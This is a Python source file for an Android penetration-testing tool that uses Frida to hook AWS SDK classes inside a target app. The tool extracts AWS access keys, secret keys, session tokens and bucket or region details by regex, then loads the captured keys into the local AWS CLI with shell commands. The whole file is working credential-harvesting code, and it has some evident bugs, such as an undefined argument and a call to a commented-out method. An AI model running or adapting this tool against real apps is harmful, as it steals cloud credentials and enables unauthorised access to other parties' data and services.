import frida
import argparse
import os,sys
import subprocess
import xml.etree.ElementTree as ET
import json,time
import re
import logging
from threading import Thread
from adb.client import Client as AdbClient
from termcolor import colored, cprint
from sflogger import sfLogger, sfFileLogger
from awstester import awsTester
from time import sleep

APKTOOL_PATH = "/usr/local/bin/apktool"

class soFrida:
    def __init__(self, pkgid):
        self.pkgid = pkgid
        self.acc_key_list = set()
        self.sec_key_list = set()
        self.session_token = set()
        self.awsregion = set()
        self.awsservice = set()
        self.awsbucket = set()
        self.key_found = False
        self.base_adb_command = ['adb']
        self.flogger = sfFileLogger(self.pkgid)
        self.flogger.filelogger.info("[+] Vulnerable PKG_ID : " + self.pkgid)
        self.flogger.filelogger.info("[!] Logging Start")
        self.dbglogger = sfLogger()
        self.apk_path = "./tmp/"

        self.javaperform = """
                            setTimeout(function() {
                                Java.perform(function() {
                                    %s
                                });
                            }, 0);"""
        # User can add aws service which is supported with awscli
        self.aws_servicelist = ['s3', 'lambda', 'kinesis', 'cognito', 'sns', 'dynamodb', 'simpledb']
        self.aws_regions = ['us-west-1', 'us-west-2', 'us-east-1', 'us-east-2','ap-east-1', 'ap-south-1', 'ap-northeast-2','ap-southeast-1','ap-southeast-2','ca-central-1','cn-north-1','cn-northwest-1','eu-central-1','eu-west-1','eu-west-2','eu-west-3','eu-north-1','sa-east-1']
    def __del__(self):
        pass
    def frida_connect(self, mode='usb', host=None):
        if mode == 'usb':
            try:
                self.device = frida.get_usb_device()
                cprint("[*] USB Connected", 'green')                
            except Exception as e:
                self.device = ""
                self.err = str(e)
            return self.device
        elif mode == 'host':
            self.device = frida.get_device_manager().add_remote_device(host)
            cprint("[*] Host Connect", 'green')
    def adb_connect(self):
        try:
            client = AdbClient(host="127.0.0.1", port=5037)
            self.adb_device = client.devices()[0]
        except Exception as e:
            self.adb_device = ""
            self.err = str(e)
        return self.adb_device
    def analyze_apk(self, path):
        self.path = path
        self.dir = path[:path.rfind(".apk")]
        if os.path.exists(self.dir) == False:
            cprint("[*] Start Decode by APKTOOL", 'green')
            command = [APKTOOL_PATH, "d", "-f", "-o", self.dir, path]
            os.system(" ".join(command))
        else:
            cprint("[*] Aleady Decoded", 'red')
        self.mani = self.dir+"/AndroidManifest.xml"

        if os.path.exists(self.mani) == False:
            cprint("no manifest file", 'red')
            sys.exit(1)
        tree = ET.parse(self.mani)
        root = tree.getroot()
        self.package = ""
        for mani in root.iter("manifest"):
            self.package = mani.attrib["package"]
            break
        print("[*] PACKAGE NAME : %s" % self.package)

    def install_apk(self):
        if self.adb_device.is_installed(self.package):
            cprint("[*] Aleady Installed Package : %s" % self.package, 'yellow')
        else:
            cprint("[*] Start Install Package : %s" % self.package, 'yellow')
            self.adb_device.install(self.path)

    def uninstall_apk(self):
        cprint("[*] Start Uninstall Pakcage : %s" % self.package, 'yellow')
        self.adb_device.uninstall(self.package)
    
    def get_class_maketrace(self, logger=""):
        print("get_class_maketrace !!!!")
        ## This is Logger Thread Func for GUI event-stream.
        def message_thread(step, msg):
            while True:
                logger.info(msg)
                if step in self.step:
                    self.step.remove(step)
                    break
                sleep(0.5)

        catch_trace_js = open('catch_make_trace.js', 'r').read()
        self.trace_flag = False
        self.search_flag = True

        self.target_cls = ["com.amazonaws.http.HttpRequest", "com.amazonaws.auth.BasicAWSCredentials", "com.amazonaws.auth.BasicSessionCredentials"]

        start_function = "\nsearch_loaded_class([%s]);" % (', '.join("'"+x+"'" for x in self.target_cls))

        ## This is Callback Func.
        ############################################################
        def trace_callback(message, data):
            if 'payload' in message:
                if message['payload'].find("start_trace:") != -1:
                    cls = message['payload'].split(":")[1]
                    cprint("[+] %s Trace Start!!" % (cls), 'yellow')
                    
                    if logger != "":
                        if cls in self.target_cls:
                            if cls == "com.amazonaws.http.HttpRequest":
                                step = "httprequest" 
                            else:
                                step = "credentials"
                            Thread(target=message_thread, args=(step, json.dumps({"step":step, "result":"success", "class":cls}),)).start()
                    self.target_cls.remove(cls)
                    if len(self.target_cls) <2 and "com.amazonaws.http.HttpRequest" not in self.target_cls:
                        self.trace_flag = True
                elif message['payload'] =="search complete":
                    self.search_flag = False
                else:
                    self.findAccessKeyId(message['payload'], logger)
            else:
                print(message['stack'])
        ########################################################### 

        script_list = []

        # if logger is "" means cli mode else is gui mode
        if logger == "":
            script = self.spwan(catch_trace_js+start_function, trace_callback)
            script_list.append(script)
        else:
            try:
                script = self.spwan(catch_trace_js+start_function, trace_callback)
                script_list.append(script)
                Thread(target=message_thread, args=("spawn", json.dumps({"step":"spawn", "result":"success"}),)).start()
            except Exception as e:
                Thread(target=message_thread, args=("spawn", json.dumps({"step":"spawn", "result":"fail", "msg":str(e)}),)).start()
                return
        
        while self.search_flag:
        	pass
        # if len(self.target_cls) == 3:
	    #     script.unload()
        i = 1

        if self.trace_flag == False:
            cprint("[!] Switching to static mode", "yellow")

        while self.trace_flag == False:
            self.search_flag = True
            start_function = "\nsearch_loaded_class([%s]);" % (', '.join("'"+x+"'" for x in self.target_cls))
            script = self.run(catch_trace_js+start_function, trace_callback)
            script_list.append(script)
            while self.search_flag:
                pass
            i+=1
            #script.unload()
        
        while not self.key_found:
            pass
        #input ("Press enter key")
        if logger != "":
            while "guicomplete" not in self.step:
                pass
            #logger.info(json.dumps({"step":"stop", "result":"success"}))
            self.debuglogger.stop()
            script_list.reverse()
            for script in script_list:
                script.unload()
            script.off("message", trace_callback)
            self.session.detach()

        
    def spwan(self, runjs, message_callback):
        pid = self.device.spawn(self.process)
        self.session = self.device.attach(pid)
        script = self.session.create_script(runjs)
        script.on("message", message_callback)
        script.load()
        self.device.resume(pid)
        return script

    def run(self, runjs, message_callback):
        self.session = self.device.attach(self.process)
        script = self.session.create_script(runjs)
        script.on("message", message_callback)
        script.load()
        return script
    
    def findAccessKeyId (self, text, logger=""):

        ## This is Logger Thread Func for GUI event-stream.
        def message_thread(step, msg):
            while True:
                logger.info(msg)
                if step in self.step:
                    self.step.remove(step)
                    break
                sleep(0.5)
            
        # Recognize AWS Key Pairs by RegEx
        regex_acc = re.compile(r"(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])")
        regex_sec = re.compile(r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])")

        regex_svc_A = re.compile(r"(?P<svc>[^/]+)\.(?P<region>[^.]+).amazonaws.com")
        regex_svc_B = re.compile(r"(\/\/(?P<svc>[^\/?#]*)).amazonaws.com")
        regex_svc_C = re.compile(r"(?P<svc>[^/]+)\-(?P<region>[^.]+).amazonaws.com")    
        # https://happyrestaurant.s3.amazonaws.com/

        regex_s3case = [re.compile(r"https:\/\/(?P<bucket>[^.]+).s3.amazonaws.com"),re.compile(r"https:\/\/(?P<bucket>[^.]+).s3.(?P<region>[^.]+).amazonaws.com"), re.compile(r"https:\/\/(?P<bucket>[^.]+).s3-(?P<region>[^.]+).amazonaws.com"), re.compile(r"https:\/\/s3\-(?P<region>[^.]+).amazonaws.com/(?P<bucket>[^.]+)")]
        
        #if text matched regex_svc_B --> Check reges_s3cases
        svc_temp = regex_svc_B.search(text)
        if svc_temp != None:
            print (text)
            if svc_temp.group('svc').find("s3") != -1:
                for regex_s3 in regex_s3case :
                    s3temp = regex_s3.search(text)
                    if s3temp is not None:
                        # print (text)
                        if logger != "":
                            if len(self.awsservice) == 0:
                                Thread(target=message_thread, args=("service", json.dumps({"step":"service", "result":"success", "name":"s3"}),)).start()
                            if len(self.awsbucket) == 0:
                                Thread(target=message_thread, args=("bucket", json.dumps({"step":"bucket", "result":"success", "name":s3temp.group('bucket')}),)).start()
                            if len(self.awsregion) == 0:
                                if (s3temp.group('region')):
                                    Thread(target=message_thread, args=("region", json.dumps({"step":"region", "result":"success", "name":s3temp.group('region')}),)).start()
                        self.awsservice.add("s3")
                        self.awsbucket.add(s3temp.group('bucket'))
                        if (s3temp.group('region')):
                            self.awsregion.add(s3temp.group('region'))
                            print (self.awsregion)
                        self.awsregion.add(s3temp.group('region'))
                        print (self.awsservice)
                        print (self.awsbucket)
                        print (self.awsregion)


            else:
                svc_tempA = regex_svc_A.search(text)
                if svc_tempA != None:
                    print (text)
                    if svc_tempA.group('region').find("s3") == -1:
                        if logger != "":
                            if len(self.awsservice) == 0:
                                Thread(target=message_thread, args=("service", json.dumps({"step":"service", "result":"success", "name":svc_tempA.group('svc')}),)).start()
                            if len(self.awsregion) == 0:
                                Thread(target=message_thread, args=("region", json.dumps({"step":"region", "result":"success", "name":svc_tempA.group('region')}),)).start()
                        self.awsservice.add(svc_tempA.group('svc'))
                        self.awsregion.add(svc_tempA.group('region'))
                        print (self.awsservice)
                        print (self.awsregion)
                
        sec = regex_sec.search(text)
        if sec != None:
            #print("[*] SecretKeyId : %s" % str(sec.group()))
            if len(self.sec_key_list) == 0:
                Thread(target=message_thread, args=("secretkeyid", json.dumps({"step":"secretkeyid", "result":"success", "name":str(sec.group())}),)).start()             
            self.sec_key_list.add(str(sec.group()))
            print (self.sec_key_list)

        acc = regex_acc.search(text)
        if acc != None:
            #print("[*] AccessKeyId : %s" % str(acc.group()))
            if len(self.acc_key_list) == 0:
                Thread(target=message_thread, args=("accesskeyid", json.dumps({"step":"accesskeyid", "result":"success", "name":str(acc.group())}),)).start()             
            self.acc_key_list.add(str(acc.group()))
            print (self.acc_key_list)

        if (text.endswith ("=") or text.endswith ("==")) and ("http" not in text):
            if len(self.session_token) == 0:
                Thread(target=message_thread, args=("sessiontoken", json.dumps({"step":"sessiontoken", "result":"success", "name":text}),)).start()             
            self.session_token.add(text)
            print (self.session_token)
        
        if len(self.sec_key_list) > 0 and len(self.acc_key_list) > 0 and len(self.awsservice) > 0 and len(self.awsregion) > 0:
            if "s3" in self.awsservice and len(self.awsbucket) > 0 or "s3" not in self.awsservice:
                self.key_found = True
                
    def print_key(self):
        if len(self.acc_key_list) == 0:
            cprint("[*] No Access Key", 'red')
        else:
            cprint("[+] AccessKeyId Found", 'yellow')
            for accesskey in list(self.acc_key_list):
                cprint("\t[-] %s" % accesskey, 'green')
                subprocess.call("aws configure set aws_access_key_id %s"%accesskey, shell=True)
                self.flogger.filelogger.info("[+] AccessKeyId : " + accesskey)
                 
        if len(self.sec_key_list) == 0:
            cprint("[*] No Secret Key", 'red')
        else:
            cprint("[+] SecretKeyId Found", 'yellow')
            for secretkey in list(self.sec_key_list):
                cprint("\t[-] %s" % secretkey, 'green')
                subprocess.call("aws configure set aws_secret_access_key %s"%secretkey, shell=True)
                self.flogger.filelogger.info("[+] SecretAceessKey : " + secretkey)
    
        if len(self.session_token) == 0:
            cprint("[*] No SessionToken", 'red')
        else:
            cprint("[+] SessionToken Found", 'yellow')
            for sessiontoken in list(self.session_token):
                cprint("\t[-] %s" % sessiontoken, 'green')
                subprocess.call("aws configure set aws_session_token %s"%sessiontoken, shell=True)
                self.flogger.filelogger.info("[+] SessionToken : " + sessiontoken)
        
        self.flogger.filelogger.info("[+] AWS Service is : " + str(self.awsservice))
        self.flogger.filelogger.info("[+] AWS Region is  : " + str(self.awsregion))
        self.flogger.filelogger.info("[+] AWS Bucket is  : " + str(self.awsbucket))

    
    def clear_logcat(self):
        adb_command = self.base_adb_command[:] 
        adb_command.append('logcat')
        adb_command.append('-c')
        try :
                
            adb_clear = subprocess.Popen(adb_command)
            # Wait for cleaning logcat
            time.sleep(1)
            cprint("[+] Logcat sucessfully cleared", 'green')
        except :
            cprint ("[!] Error occured wuth cleaning logcat",'red')
    
    # def save_logcat(self, process):
    #     adb_command = self.base_adb_command[:]
    #     adb_command.append('logcat')
    #     adb_command.extend(['-d'])
    #     adb = subprocess.Popen(adb_command, stdout=subprocess.PIPE)
    #     adb2 = subprocess.Popen(['grep','amazonaws'], stdin=adb.stdout ,stdout=subprocess.PIPE)
    #     adb3 = subprocess.Popen(['grep',process], stdin=adb2.stdout ,stdout=subprocess.PIPE)
    #     for line in adb3.stdout.readlines():
    #         print (line.decode('utf-8'))
    #         self.flogger.filelogger.info("[Logcat] :" + line.decode('utf-8'))

    # def aws_autoconfig(self):
    #     cprint ("[*] Setting Up AWS Configuration" , "yellow")
    #     subprocess.call("aws configure set %s %s"%key %value, shell=True) 
                    
    def remove_dir(self):
        cprint("[*] Remove Apktool Dirctory", 'green')
        command = ["rm", "-rf", self.dir]
        os.system(" ".join(command))
    
    def clear_recentapp(self, pkgid):
        adb_command = self.base_adb_command[:] 
        adb_command.append('shell')
        adb_command.append('am')
        adb_command.append('force-stop')
        adb_command.append(pkgid)
        try :

            subprocess.Popen(adb_command)
            # Wait for cleaning recent app
            time.sleep(1)
            print ("app cleaned")
        except :
            cprint ("[!] Error occured wuth cleaning app",'red')

    # def get_installedapps(self, pkgid):
    #     adb_command = self.base_adb_command[:]
    #     adb_command.append('shell') 
    #     adb_command.append('pm')
    #     adb_command.append('list')
    #     adb_command.append('packages')
    #     adb_command.append(pkgid)
    #     try :
    #         s = subprocess.Popen(adb_command, stdout=subprocess.PIPE)
    #         installed_applist = s.stdout.readlines()
    #         # print (installed_applist)
    #         for x in installed_applist:
    #             # cprint (x.split(':')[1],'blue')
    #             cprint (str(x).split(":")[1].strip("\\n'"), 'blue')
    #     except:
    #         cprint ("Error", 'red')

    def soFrida_start(self, debuglogger):
        self.debuglogger = debuglogger
        logger = debuglogger.logger
        self.step = set()
        sleep(1)
        while True:
            sleep(0.5)
            if "frida-connect" in self.step:
                self.step.remove("frida-connect")
                break
            device = self.frida_connect()
            if device == "":
                logger.info(json.dumps({"step":"frida_connect", "result":"fail", "msg":self.err}))
            else:
                logger.info(json.dumps({"step":"frida_connect", "result":"success"}))
    
        while True:
            sleep(0.5)
            if "adb-connect" in self.step:
                self.step.remove("adb-connect")
                break
            adb_device = self.adb_connect()
            if adb_device == "":
                logger.info(json.dumps({"step":"adb_connect", "result":"fail", "msg":self.err}))
            else:
                logger.info(json.dumps({"step":"adb_connect", "result":"success"}))
                    
        if adb_device.is_installed(self.pkgid):
             while True:
                logger.info(json.dumps({"step":"apk_install", "result":"installed", "package":self.pkgid}))
                if "apk-install" in self.step:
                    self.step.remove("apk-install")
                    break
                sleep(0.5) 
        
        while True:
            sleep(0.5)
            if "apk-install" in self.step:
                self.step.remove("apk-install")
                break
            if adb_device.is_installed(self.pkgid):
                logger.info(json.dumps({"step":"apk_install", "result":"installed", "package":self.pkgid}))
            else:
                while True:
                    logger.info(json.dumps({"step":"apk_install", "result":"not installed", "package":self.pkgid}))
                    if "apk-not-installed" in self.step:
                        self.step.remove("apk-not-installed")
                        break
                    sleep(0.5) 
                while True:
                    logger.info(json.dumps({"step":"apk_install", "result":"installing", "package":self.pkgid}))
                    if "apk-installing" in self.step:
                        self.step.remove("apk-installing")
                        break
                    sleep(0.5) 
                try:
                    adb_device.install(self.apk_path+self.pkgid+".apk")
                    logger.info(json.dumps({"step":"apk_install", "result":"installed", "package":self.pkgid}))
                except Exception as e:
                    logger.info(json.dumps({"step":"apk_install", "result":"fail", "msg":str(e), "package":self.pkgid}))
        self.process = self.pkgid
        if "stop" not in self.step:
            self.get_class_maketrace(logger)
            
        
if __name__ == '__main__':
    ap = argparse.ArgumentParser(description='Test APIBleed vulnerability - cloud backend - not for testing general mobile vulnerability.')
    ap.add_argument('-t', '--target', dest='target', required=False, help='apk file path')
    ap.add_argument('-p', '--process', dest='process', required=False, help='Prcess Nmae')
    ap.add_argument('-U', '--usb', action='store_true')
    ap.add_argument('-H', '--host', dest='host', nargs='?', default='', required=False)

    args = ap.parse_args()
    sf = soFrida(args.process)
    if args.usb and args.host == None:
        cprint("Usage : %s -U -t [target] or %s -H [frida_listen_ip] -t [target]" % (sys.argv[0], sys.argv[0]), 'red')
    elif args.usb:
        sf.frida_connect('usb')
    elif args.H != None:
        sf.frida_connect('host', args.host)
    sf.adb_connect()
    sf.clear_recentapp(args.process)
    time.sleep(0.5)
    # Clear Logcat
    sf.clear_logcat()
    time.sleep(1)
    sf.process = args.process
    sf.get_class_maketrace()
    sf.print_key()
    # sf.save_logcat(args.process)
    cprint ("[+] Done")
    # sf.aws_finder()
    # sf.bucket_finder(args.process+".log")
    sf.get_installedapps("com")
    print (sf.awsservice)
    print (sf.awsregion)
    print (sf.awsbucket)